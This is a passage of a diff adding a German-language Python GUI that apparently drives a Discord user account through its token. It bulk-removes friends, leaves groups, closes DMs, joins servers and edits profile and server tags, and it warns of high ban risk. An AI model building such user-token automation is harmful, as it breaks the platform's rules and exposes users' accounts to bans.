+            command=self._select_all_friends
+        )
+        btn_sel_all.pack(side="left", padx=(0, 6))
+
+        btn_sel_none = ctk.CTkButton(
+            sel_box,
+            text="Keine",
+            font=("Segoe UI", 9.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["btn_gray_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            width=60,
+            command=self._deselect_all_friends
+        )
+        btn_sel_none.pack(side="left")
+
+        act_box = ctk.CTkFrame(tb_row2, fg_color="transparent")
+        act_box.pack(side="right")
+
+        self.btn_stop_friends = ctk.CTkButton(
+            act_box,
+            text="Stop",
+            font=("Segoe UI", 10, "bold"),
+            fg_color=C["btn_gray"],
+            text_color=C["text_muted"],
+            hover_color=C["red_hover"],
+            border_color=C["btn_gray_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            width=65,
+            state="disabled",
+            command=self._stop_batch_friends
+        )
+        self.btn_stop_friends.pack(side="right", padx=(8, 0))
+
+        btn_remove_all = ctk.CTkButton(
+            act_box,
+            text="Alle Freunde entfernen",
+            font=("Segoe UI", 10, "bold"),
+            fg_color=C["red_bg"],
+            text_color=C["red_text"],
+            hover_color=C["red_hover"],
+            border_color=C["red_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            command=self._remove_all_friends
+        )
+        btn_remove_all.pack(side="right", padx=(8, 0))
+
+        self.btn_remove_selected = ctk.CTkButton(
+            act_box,
+            text="Ausgewaehlte entfernen (0)",
+            font=("Segoe UI", 10, "bold"),
+            fg_color=C["red_bg"],
+            text_color=C["red_text"],
+            hover_color=C["red_hover"],
+            border_color=C["red_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            command=self._remove_selected_friends
+        )
+        self.btn_remove_selected.pack(side="right")
+
+        self.friends_scroll = ctk.CTkScrollableFrame(self.frame_friends, fg_color="transparent")
+        self.friends_scroll.pack(fill="both", expand=True)
+
+        self._render_all_friends_cards()
+
+    def _render_all_friends_cards(self):
+        for widget in self.friends_scroll.winfo_children():
+            widget.destroy()
+
+        self.friend_cards.clear()
+        self.friend_checkboxes.clear()
+
+        if not self.friends_data:
+            empty_box = ctk.CTkFrame(self.friends_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
+            empty_box.pack(fill="x", pady=20)
+            ctk.CTkLabel(empty_box, text="Keine Freunde oder Gruppen vorhanden.", font=("Segoe UI", 12), text_color=C["text_muted"]).pack(pady=24)
+            return
+
+        for item in self.friends_data:
+            fid = str(item.get("id", "0"))
+            fname = item.get("name", "Unbekannt")
+            sub_info = item.get("username", "")
+            type_lbl = item.get("type_name", "Freund")
+            is_group = item.get("is_group", False)
+            tag = "GR" if is_group else ("DM" if type_lbl == "DM" else "FR")
+
+            card = ctk.CTkFrame(self.friends_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
+            card.pack(fill="x", pady=3)
+            self.friend_cards[fid] = card
+
+            ci = ctk.CTkFrame(card, fg_color="transparent")
+            ci.pack(fill="x", padx=16, pady=8)
+
+            chk_var = ctk.BooleanVar(value=False)
+            self.friend_checkboxes[fid] = chk_var
+            chk = ctk.CTkCheckBox(
+                ci,
+                text="",
+                variable=chk_var,
+                width=22,
+                checkbox_width=18,
+                checkbox_height=18,
+                corner_radius=4,
+                border_width=1.5,
+                border_color=C["card_border_hi"],
+                fg_color=C["blurple"],
+                hover_color=C["blurple_hi"],
+                command=self._update_selected_friends_count
+            )
+            chk.pack(side="left", padx=(0, 8))
+
+            icon_badge = ctk.CTkLabel(ci, text=tag, font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)
+            icon_badge.pack(side="left", padx=(0, 12))
+
+            title_col = ctk.CTkFrame(ci, fg_color="transparent")
+            title_col.pack(side="left", fill="x", expand=True)
+
+            ctk.CTkLabel(title_col, text=fname, font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(anchor="w")
+            ctk.CTkLabel(title_col, text=f"{sub_info}  |  ID: {fid}", font=("Consolas", 9.5), text_color=C["text_muted"]).pack(anchor="w")
+
+            badge = ctk.CTkLabel(
+                ci,
+                text=type_lbl,
+                font=("Segoe UI", 9.5, "bold"),
+                fg_color=C["card_alt"],
+                text_color=C["text_sub"],
+                corner_radius=8,
+                padx=10,
+                pady=4
+            )
+            badge.pack(side="right", padx=(10, 0))
+
+            btn_rem = ctk.CTkButton(
+                ci,
+                text="Verlassen" if is_group else "Entfernen",
+                font=("Segoe UI", 10.5, "bold"),
+                fg_color=C["red_bg"],
+                text_color=C["red_text"],
+                hover_color=C["red_hover"],
+                border_color=C["red_border"],
+                border_width=1,
+                height=30,
+                corner_radius=8,
+                command=lambda i=fid, g=is_group: self._remove_friend_direct(i, g)
+            )
+            btn_rem.pack(side="right", padx=(10, 0))
+
+        self._update_selected_friends_count()
+
+    def _update_selected_friends_count(self):
+        cnt = sum(1 for var in self.friend_checkboxes.values() if var.get())
+        if hasattr(self, "lbl_friends_selected_count"):
+            self.lbl_friends_selected_count.configure(text=f"({cnt} ausgewaehlt)")
+        if hasattr(self, "btn_remove_selected"):
+            self.btn_remove_selected.configure(text=f"Ausgewaehlte entfernen ({cnt})")
+
+    def _select_all_friends(self):
+        for var in self.friend_checkboxes.values():
+            var.set(True)
+        self._update_selected_friends_count()
+
+    def _deselect_all_friends(self):
+        for var in self.friend_checkboxes.values():
+            var.set(False)
+        self._update_selected_friends_count()
+
+    def _filter_friends(self):
+        query = self.friends_search_var.get().strip().lower()
+        for f in self.friends_data:
+            fid = str(f.get("id", "0"))
+            card = self.friend_cards.get(fid)
+            if not card:
+                continue
+            fname = str(f.get("name", "")).lower()
+            fuser = str(f.get("username", "")).lower()
+            matches = not query or (query in fname or query in fuser or query in fid)
+            if matches:
+                if not card.winfo_ismapped():
+                    card.pack(fill="x", pady=3)
+            else:
+                if card.winfo_ismapped():
+                    card.pack_forget()
+
+    def _remove_single_friend_ui(self, item_id):
+        fid_str = str(item_id)
+        card = self.friend_cards.pop(fid_str, None)
+        self.friend_checkboxes.pop(fid_str, None)
+        if card:
+            try: card.destroy()
+            except Exception: pass
+        self.friends_data = [f for f in self.friends_data if str(f.get("id")) != fid_str]
+        self.nav_btns["friends"].configure(text=f"Freunde & Gruppen ({len(self.friends_data)})")
+        self.lbl_friends_title.configure(text=f"Freunde & Gruppen ({len(self.friends_data)})")
+        self._update_selected_friends_count()
+
+    def _remove_friend_direct(self, item_id, is_group):
+        self._remove_single_friend_ui(item_id)
+        def _do_remove():
+            if not self.token or self.token.startswith("mfa.VkO_") or "DEMO" in self.token:
+                return
+
+            if is_group:
+                make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{item_id}", self.token)
+            else:
+                # 1. Freundschaft aufloesen
+                make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/relationships/{item_id}", self.token)
+
+                # 2. Chat (DM Channel) schliessen
+                dm_cid = self.user_to_channel_map.get(str(item_id))
+                if not dm_cid:
+                    try:
+                        res_open = make_discord_api_request("POST", "https://discord.com/api/v10/users/@me/channels", self.token, json_data={"recipient_id": str(item_id)})
+                        if res_open and res_open.status_code in (200, 201):
+                            dm_cid = res_open.json().get("id")
+                            if dm_cid:
+                                self.user_to_channel_map[str(item_id)] = str(dm_cid)
+                    except Exception:
+                        pass
+
+                if dm_cid:
+                    make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{dm_cid}", self.token)
+
+        threading.Thread(target=_do_remove, daemon=True).start()
+
+    def _remove_selected_friends(self):
+        selected_ids = [fid for fid, var in self.friend_checkboxes.items() if var.get()]
+        if not selected_ids:
+            return
+        self._batch_remove_friends(selected_ids)
+
+    def _remove_all_friends(self):
+        all_ids = [str(f.get("id")) for f in self.friends_data]
+        if not all_ids:
+            return
+        self._batch_remove_friends(all_ids)
+
+    def _stop_batch_friends(self):
+        self.friend_stop_requested = True
+        if hasattr(self, "btn_stop_friends"):
+            self.btn_stop_friends.configure(text="Stoppe...", state="disabled")
+
+    def _batch_remove_friends(self, ids_list):
+        if self.friend_leave_in_progress or not ids_list:
+            return
+
+        self.friend_leave_in_progress = True
+        self.friend_stop_requested = False
+
+        if hasattr(self, "btn_stop_friends"):
+            self.btn_stop_friends.configure(
+                state="normal",
+                fg_color=C["red_bg"],
+                text_color=C["red_text"],
+                border_color=C["red_border"],
+                hover_color=C["red_hover"],
+                text="Stop"
+            )
+
+        def _worker():
+            type_map = {str(f.get("id")): f.get("is_group", False) for f in self.friends_data}
+
+            for fid in list(ids_list):
+                if self.friend_stop_requested:
+                    break
+
+                is_group = type_map.get(str(fid), False)
+                self.after(0, lambda target=fid: self._remove_single_friend_ui(target))
+
+                if self.token and not self.token.startswith("mfa.VkO_") and "DEMO" not in self.token:
+                    if is_group:
+                        make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{fid}", self.token)
+                    else:
+                        make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/relationships/{fid}", self.token)
+                        dm_cid = self.user_to_channel_map.get(str(fid))
+                        if not dm_cid:
+                            res_open = make_discord_api_request("POST", "https://discord.com/api/v10/users/@me/channels", self.token, json_data={"recipient_id": str(fid)})
+                            if res_open and res_open.status_code in (200, 201):
+                                dm_cid = res_open.json().get("id")
+                                if dm_cid:
+                                    self.user_to_channel_map[str(fid)] = str(dm_cid)
+                        if dm_cid:
+                            make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{dm_cid}", self.token)
+
+                    for _ in range(5):
+                        if self.friend_stop_requested:
+                            break
+                        time.sleep(0.04)
+                else:
+                    time.sleep(0.04)
+
+            self.friend_leave_in_progress = False
+            self.friend_stop_requested = False
+            self.after(0, lambda: self._on_batch_friends_finished())
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _on_batch_friends_finished(self):
+        if hasattr(self, "btn_stop_friends"):
+            self.btn_stop_friends.configure(
+                state="disabled",
+                fg_color=C["btn_gray"],
+                text_color=C["text_muted"],
+                border_color=C["btn_gray_border"],
+                text="Stop"
+            )
+
+    def _refresh_friends_data(self):
+        if not self.token or "DEMO" in self.token:
+            self._render_all_friends_cards()
+            return
+
+        def _fetch():
+            try:
+                fresh = []
+                rf = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/relationships", self.token)
+                if rf and rf.status_code == 200:
+                    for r in rf.json():
+                        u_info = r.get("user", {})
+                        fresh.append({
+                            "id": str(r.get("id", u_info.get("id"))),
+                            "name": u_info.get("global_name") or u_info.get("username", "Freund"),
+                            "username": u_info.get("username", ""),
+                            "type_name": "Freund" if r.get("type") == 1 else ("Anfrage" if r.get("type") in (3, 4) else "Blockiert"),
+                            "is_group": False
+                        })
+                rc = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/channels", self.token)
+                if rc and rc.status_code == 200:
+                    for ch in rc.json():
+                        ch_type = ch.get("type")
+                        recips = ch.get("recipients", [])
+                        recip_names = ", ".join([rcp.get("username", "") for rcp in recips[:3]])
+                        if ch_type == 3:
+                            g_name = ch.get("name") or (f"Gruppe ({recip_names})" if recip_names else "Gruppe")
+                            fresh.append({
+                                "id": str(ch.get("id")),
+                                "name": g_name,
+                                "username": f"{len(recips)} Mitglieder",
+                                "type_name": "Gruppe",
+                                "is_group": True
+                            })
+                        elif ch_type == 1 and recips:
+                            dm_uid = str(recips[0].get("id"))
+                            self.user_to_channel_map[dm_uid] = str(ch.get("id"))
+                            if not any(f["id"] == dm_uid for f in fresh):
+                                fresh.append({
+                                    "id": str(ch.get("id")),
+                                    "name": recips[0].get("global_name") or recips[0].get("username", "DM"),
+                                    "username": recips[0].get("username", ""),
+                                    "type_name": "DM",
+                                    "is_group": True
+                                })
+                self.friends_data = fresh
+                self.after(0, lambda: [
+                    self.nav_btns["friends"].configure(text=f"Freunde & Gruppen ({len(self.friends_data)})"),
+                    self.lbl_friends_title.configure(text=f"Freunde & Gruppen ({len(self.friends_data)})"),
+                    self._render_all_friends_cards(),
+                    self._populate_quick_targets()
+                ])
+            except Exception:
+                pass
+
+        threading.Thread(target=_fetch, daemon=True).start()
+
+    # --------------------------------------------------------------------------
+    # 5. SERVER BEITRETEN TAB (Per Link oder Code)
+    # --------------------------------------------------------------------------
+    def _build_join_tab(self):
+        container = ctk.CTkFrame(self.frame_join, fg_color="transparent")
+        container.pack(fill="both", expand=True)
+
+        card = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        card.pack(fill="x", pady=(0, 14))
+
+        card_in = ctk.CTkFrame(card, fg_color="transparent")
+        card_in.pack(fill="x", padx=24, pady=24)
+
+        ctk.CTkLabel(card_in, text="Server beitreten per Einladungslink", font=("Segoe UI", 16, "bold"), text_color=C["text"]).pack(anchor="w")
+        ctk.CTkLabel(card_in, text="Gib einen gueltigen Discord Einladungslink oder Invite-Code ein, um dem Server sofort beizutreten.", font=("Segoe UI", 11), text_color=C["text_muted"]).pack(anchor="w", pady=(3, 10))
+
+        # Kleine Warnbox
+        box_warn_join = ctk.CTkFrame(card_in, fg_color=C["red_bg"], corner_radius=8, border_width=1, border_color=C["red_border"])
+        box_warn_join.pack(fill="x", pady=(0, 14))
+        ctk.CTkLabel(
+            box_warn_join,
+            text="Warnung: Hohe Ban-Gefahr",
+            font=("Segoe UI", 10.5, "bold"),
+            text_color=C["red_text"]
+        ).pack(anchor="w", padx=12, pady=5)
+
+        input_row = ctk.CTkFrame(card_in, fg_color="transparent")
+        input_row.pack(fill="x")
+
+        self.join_input_var = ctk.StringVar()
+        self.entry_join = ctk.CTkEntry(
+            input_row,
+            textvariable=self.join_input_var,
+            placeholder_text="https://discord.gg/... oder Invite-Code",
+            height=40,
+            corner_radius=12,
+            fg_color=C["card_alt"],
+            border_color=C["card_border_hi"],
+            text_color=C["text"]
+        )
+        self.entry_join.pack(side="left", fill="x", expand=True, padx=(0, 10))
+
+        btn_join = ctk.CTkButton(
+            input_row,
+            text="Server beitreten",
+            font=("Segoe UI", 11.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=40,
+            width=160,
+            corner_radius=12,
+            command=self._join_server_by_link
+        )
+        btn_join.pack(side="right")
+
+        # Feedback & Preview Box
+        self.join_status_card = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        self.join_status_card.pack(fill="both", expand=True)
+
+        sc_in = ctk.CTkFrame(self.join_status_card, fg_color="transparent")
+        sc_in.pack(fill="both", expand=True, padx=24, pady=24)
+
+        ctk.CTkLabel(sc_in, text="Status & Einladungsdetails", font=("Segoe UI", 14, "bold"), text_color=C["text"]).pack(anchor="w")
+
+        self.lbl_join_info = ctk.CTkLabel(
+            sc_in,
+            text="Bereit zum Beitreten. Fuege oben einen Invite-Link ein und klicke auf 'Server beitreten'.",
+            font=("Segoe UI", 11.5),
+            text_color=C["text_sub"],
+            justify="left"
+        )
+        self.lbl_join_info.pack(anchor="w", pady=(10, 0))
+
+        self.lbl_join_details = ctk.CTkLabel(
+            sc_in,
+            text="",
+            font=("Consolas", 10.5),
+            text_color=C["text_muted"],
+            justify="left"
+        )
+        self.lbl_join_details.pack(anchor="w", pady=(8, 0))
+
+    def _set_join_status(self, main_text, details="", is_error=False, is_success=False):
+        color = C["red_text"] if is_error else (C["green"] if is_success else C["text_sub"])
+        self.lbl_join_info.configure(text=main_text, text_color=color)
+        self.lbl_join_details.configure(text=details)
+
+    def _join_server_by_link(self):
+        raw_link = self.join_input_var.get().strip()
+        if not raw_link:
+            self._set_join_status("Bitte gib einen Invite-Link oder Code ein.", is_error=True)
+            return
+
+        cleaned = raw_link.replace("https://", "").replace("http://", "").replace("discord.gg/", "").replace("discord.com/invite/", "").strip()
+        code = cleaned.split("/")[0].split("?")[0].strip()
+        if not code:
+            self._set_join_status("Konnte keinen gueltigen Einladungscode erkennen.", is_error=True)
+            return
+
+        self._set_join_status(f"Verarbeite Einladung ({code})...", details="Sende Beitrittsanfrage an Discord API...")
+
+        def _do_join():
+            if not self.token or self.token.startswith("mfa.VkO_") or "DEMO" in self.token:
+                time.sleep(0.4)
+                mock_guild = {"id": "998877665544", "name": f"Community ({code})", "owner": False}
+                self.guilds_data.append(mock_guild)
+                self.after(0, lambda: self._on_join_success(mock_guild.get("name"), mock_guild.get("id"), "Demo-Modus"))
+                return
+
+            try:
+                invite_info = {}
+                r_info = make_discord_api_request("GET", f"https://discord.com/api/v10/invites/{code}?with_counts=true", self.token)
+                if r_info and r_info.status_code == 200:
+                    invite_info = r_info.json()
+
+                res = make_discord_api_request("POST", f"https://discord.com/api/v10/invites/{code}", self.token, json_data={})
+                if res and res.status_code in (200, 204):
+                    res_data = res.json() if res.status_code == 200 else {}
+                    g_info = res_data.get("guild", {}) or invite_info.get("guild", {})
+                    g_name = g_info.get("name", code)
+                    g_id = g_info.get("id", "Unbekannt")
+                    members_cnt = invite_info.get("approximate_member_count", "—")
+
+                    if not any(str(g.get("id")) == str(g_id) for g in self.guilds_data):
+                        self.guilds_data.append({"id": g_id, "name": g_name, "owner": False})
+
+                    details_txt = f"Server Name: {g_name}\nServer ID:   {g_id}\nMitglieder:  {members_cnt}"
+                    self.after(0, lambda: self._on_join_success(g_name, g_id, details_txt))
+                elif res and res.status_code == 404:
+                    self.after(0, lambda: self._set_join_status("Einladungscode existiert nicht oder ist abgelaufen.", details=f"Code: {code} (Status 404)", is_error=True))
+                elif res and res.status_code == 429:
+                    self.after(0, lambda: self._set_join_status("Discord Rate-Limit erreicht. Bitte warte kurz.", details="Status 429", is_error=True))
+                else:
+                    err_code = res.status_code if res else "Timeout"
+                    err_txt = res.text[:120] if res else ""
+                    self.after(0, lambda: self._set_join_status(f"Beitreten fehlgeschlagen ({err_code}).", details=err_txt, is_error=True))
+            except Exception as ex:
+                self.after(0, lambda: self._set_join_status("Verbindungsfehler beim Beitreten.", details=str(ex), is_error=True))
+
+        threading.Thread(target=_do_join, daemon=True).start()
+
+    def _on_join_success(self, g_name, g_id, details=""):
+        self._set_join_status(f"Erfolgreich beigetreten: {g_name}", details=f"Server-ID: {g_id}\n{details}", is_success=True)
+        self.nav_btns["guilds"].configure(text=f"Server ({len(self.guilds_data)})")
+        if hasattr(self, "lbl_guilds_title"):
+            self.lbl_guilds_title.configure(text=f"Verbundene Server ({len(self.guilds_data)})")
+        self._render_all_guilds_cards()
+        self._update_extra_guild_options()
+        self.entry_join.delete(0, "end")
+
+    # --------------------------------------------------------------------------
+    # 6. EXTRA TAB (BIO, NAME, NUTZERNAME, SERVER-TAG RAUSNEHMEN & REINMACHEN)
+    # --------------------------------------------------------------------------
+    def _build_extra_tab(self):
+        scroll = ctk.CTkScrollableFrame(self.frame_extra, fg_color="transparent")
+        scroll.pack(fill="both", expand=True)
+
+        card_prof = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        card_prof.pack(fill="x", pady=(0, 14))
+
+        cp_in = ctk.CTkFrame(card_prof, fg_color="transparent")
+        cp_in.pack(fill="x", padx=22, pady=20)
+
+        ctk.CTkLabel(cp_in, text="Profil & Identitaet anpassen", font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(anchor="w")
+        ctk.CTkLabel(cp_in, text="Aendere deinen Anzeigenamen, Nutzernamen oder deine Account-Bio direkt ueber das Tool.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 10))
+
+        # Kleine Warnbox
+        box_warn_prof = ctk.CTkFrame(cp_in, fg_color=C["red_bg"], corner_radius=8, border_width=1, border_color=C["red_border"])
+        box_warn_prof.pack(fill="x", pady=(0, 14))
+        ctk.CTkLabel(
+            box_warn_prof,
+            text="Warnung: Hohe Ban-Gefahr",
+            font=("Segoe UI", 10.5, "bold"),
+            text_color=C["red_text"]
+        ).pack(anchor="w", padx=12, pady=5)
+
+        # 1. Anzeigename (Global Display Name)
+        row_gn = ctk.CTkFrame(cp_in, fg_color="transparent")
+        row_gn.pack(fill="x", pady=4)
+        ctk.CTkLabel(row_gn, text="Anzeigename:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")
+        self.entry_display_name = ctk.CTkEntry(row_gn, height=34, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
+        self.entry_display_name.pack(side="left", fill="x", expand=True, padx=(0, 10))
+        curr_gname = self.user_data.get("global_name") or self.user_data.get("username", "")
+        self.entry_display_name.insert(0, curr_gname)
+        btn_save_gn = ctk.CTkButton(
+            row_gn,
+            text="Speichern",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            width=100,
+            height=34,
+            corner_radius=10,
+            command=self._save_display_name
+        )
+        btn_save_gn.pack(side="right")
+
+        # 2. Nutzername (@username) & optionales Passwort
+        row_un = ctk.CTkFrame(cp_in, fg_color="transparent")
+        row_un.pack(fill="x", pady=4)
+        ctk.CTkLabel(row_un, text="Nutzername (@):", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")
+        self.entry_username = ctk.CTkEntry(row_un, height=34, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
+        self.entry_username.pack(side="left", fill="x", expand=True, padx=(0, 8))
+        self.entry_username.insert(0, self.user_data.get("username", ""))
+
+        self.entry_password = ctk.CTkEntry(
+            row_un,
+            placeholder_text="Passwort (falls noetig)",
+            show="*",
+            height=34,
+            width=160,
+            corner_radius=10,
+            fg_color=C["card_alt"],
+            border_color=C["card_border"],
+            text_color=C["text"]
+        )
+        self.entry_password.pack(side="left", padx=(0, 10))
+
+        btn_save_un = ctk.CTkButton(
+            row_un,
+            text="Speichern",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            width=100,
+            height=34,
+            corner_radius=10,
+            command=self._save_username
+        )
+        btn_save_un.pack(side="right")
+
+        # 3. Bio (Ueber mich)
+        ctk.CTkLabel(cp_in, text="Bio (Ueber mich):", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(anchor="w", pady=(8, 4))
+        self.txt_bio = ctk.CTkTextbox(
+            cp_in,
+            height=70,
+            corner_radius=10,
+            fg_color=C["card_alt"],
+            border_color=C["card_border"],
+            border_width=1,
+            text_color=C["text"],
+            font=("Segoe UI", 10.5)
+        )
+        self.txt_bio.pack(fill="x", pady=(0, 8))
+        curr_bio = self.user_data.get("bio", "")
+        if curr_bio:
+            self.txt_bio.insert("1.0", curr_bio)
+
+        row_bio_btns = ctk.CTkFrame(cp_in, fg_color="transparent")
+        row_bio_btns.pack(fill="x")
+
+        btn_save_bio = ctk.CTkButton(
+            row_bio_btns,
+            text="Bio speichern",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=32,
+            width=120,
+            corner_radius=10,
+            command=self._save_bio
+        )
+        btn_save_bio.pack(side="left", padx=(0, 8))
+
+        btn_clear_bio = ctk.CTkButton(
+            row_bio_btns,
+            text="Bio leeren",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["red_bg"],
+            text_color=C["red_text"],
+            hover_color=C["red_hover"],
+            border_color=C["red_border"],
+            border_width=1,
+            height=32,
+            width=100,
+            corner_radius=10,
+            command=self._clear_bio
+        )
+        btn_clear_bio.pack(side="left")
+
+        # ---------------- KARTE 2: SERVER-TAG & SPITZNAME ----------------
+        card_tag = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        card_tag.pack(fill="x", pady=(0, 14))
+
+        ct_in = ctk.CTkFrame(card_tag, fg_color="transparent")
+        ct_in.pack(fill="x", padx=22, pady=20)
+
+        ctk.CTkLabel(ct_in, text="Server-Tag & Spitzname verwalten", font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(anchor="w")
+        ctk.CTkLabel(ct_in, text="Setze einen neuen Server-Tag / Nickname oder nimm deinen Server-Tag auf einzelnen oder allen Servern restlos raus.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 10))
+
+        # Kleine Warnbox
+        box_warn_tag = ctk.CTkFrame(ct_in, fg_color=C["red_bg"], corner_radius=8, border_width=1, border_color=C["red_border"])
+        box_warn_tag.pack(fill="x", pady=(0, 14))
+        ctk.CTkLabel(
+            box_warn_tag,
+            text="Warnung: Hohe Ban-Gefahr",
+            font=("Segoe UI", 10.5, "bold"),
+            text_color=C["red_text"]
+        ).pack(anchor="w", padx=12, pady=5)
+
+        # Server Auswahl Dropdown
+        row_srv = ctk.CTkFrame(ct_in, fg_color="transparent")
+        row_srv.pack(fill="x", pady=4)
+        ctk.CTkLabel(row_srv, text="Ziel-Server:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")
+
+        self.server_options = self._get_server_dropdown_list()
+        self.server_tag_target_var = ctk.StringVar(value=self.server_options[0] if self.server_options else "Keine Server")
+        self.opt_server_select = ctk.CTkOptionMenu(
+            row_srv,
+            values=self.server_options,
+            variable=self.server_tag_target_var,
+            height=34,
+            corner_radius=10,
+            fg_color=C["card_alt"],
+            button_color=C["card_border_hi"],
+            button_hover_color=C["card_hover"],
+            text_color=C["text"]
+        )
+        self.opt_server_select.pack(side="left", fill="x", expand=True)
+
+        row_tag_input = ctk.CTkFrame(ct_in, fg_color="transparent")
+        row_tag_input.pack(fill="x", pady=8)
+        ctk.CTkLabel(row_tag_input, text="Neuer Server-Tag:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")
+        self.entry_server_tag = ctk.CTkEntry(
+            row_tag_input,
+            placeholder_text="z.B. [NIGHT] oder eigener Tag (leer lassen zum Rausnehmen)",
+            height=34,
+            corner_radius=10,
+            fg_color=C["card_alt"],
+            border_color=C["card_border"],
+            text_color=C["text"]
+        )
+        self.entry_server_tag.pack(side="left", fill="x", expand=True)
+
+        row_tag_btns = ctk.CTkFrame(ct_in, fg_color="transparent")
+        row_tag_btns.pack(fill="x", pady=(4, 0))
+
+        btn_set_tag = ctk.CTkButton(
+            row_tag_btns,
+            text="Server-Tag setzen",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=34,
+            width=150,
+            corner_radius=10,
+            command=self._apply_server_tag
+        )
+        btn_set_tag.pack(side="left", padx=(0, 8))
+
+        btn_remove_tag = ctk.CTkButton(
+            row_tag_btns,
+            text="Server-Tag rausnehmen",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["red_bg"],
+            text_color=C["red_text"],
+            hover_color=C["red_hover"],
+            border_color=C["red_border"],
+            border_width=1,
+            height=34,
+            width=175,
+            corner_radius=10,
+            command=self._remove_server_tag
+        )
+        btn_remove_tag.pack(side="left", padx=(0, 8))
+
+        btn_remove_clan = ctk.CTkButton(
+            row_tag_btns,
+            text="Clan-Tag entfernen",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=34,
+            width=150,
+            corner_radius=10,
+            command=self._remove_clan_tag
+        )
+        btn_remove_clan.pack(side="left", padx=(0, 8))
+
+        self.btn_stop_extra = ctk.CTkButton(
+            row_tag_btns,
+            text="Stop",
+            font=("Segoe UI", 10, "bold"),
+            fg_color=C["btn_gray"],
+            text_color=C["text_muted"],
+            hover_color=C["red_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=34,
+            width=65,
+            corner_radius=10,
+            state="disabled",
+            command=self._stop_extra_operation
+        )
+        self.btn_stop_extra.pack(side="right")
+
+        # ---------------- KARTE 3: STATUS & RUECKMELDUNG ----------------
+        card_st = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        card_st.pack(fill="x", pady=(0, 10))
+
+        cs_in = ctk.CTkFrame(card_st, fg_color="transparent")
+        cs_in.pack(fill="x", padx=22, pady=16)
+
+        ctk.CTkLabel(cs_in, text="Status & Rueckmeldung", font=("Segoe UI", 13, "bold"), text_color=C["text"]).pack(anchor="w")
+
+        self.lbl_extra_status = ctk.CTkLabel(cs_in, text="Bereit fuer Aenderungen.", font=("Segoe UI", 11), text_color=C["text_sub"], justify="left")
+        self.lbl_extra_status.pack(anchor="w", pady=(6, 2))
+
+        self.lbl_extra_details = ctk.CTkLabel(cs_in, text="", font=("Consolas", 10), text_color=C["text_muted"], justify="left")
+        self.lbl_extra_details.pack(anchor="w")
+
+    def _get_server_dropdown_list(self):
+        opts = ["Auf allen Servern gleichzeitig"]
+        for g in self.guilds_data:
+            gname = g.get("name", "Server")
+            gid = str(g.get("id", ""))
+            opts.append(f"{gname} ({gid})")
+        return opts
+
+    def _update_extra_guild_options(self):
+        if hasattr(self, "opt_server_select"):
+            opts = self._get_server_dropdown_list()
+            self.opt_server_select.configure(values=opts)
+            if self.server_tag_target_var.get() not in opts:
+                self.server_tag_target_var.set(opts[0] if opts else "Keine Server")
+
+    def _set_extra_status(self, main_text, details="", is_error=False, is_success=False):
+        color = C["red_text"] if is_error else (C["green"] if is_success else C["text_sub"])
+        self.after(0, lambda: [
+            self.lbl_extra_status.configure(text=main_text, text_color=color),
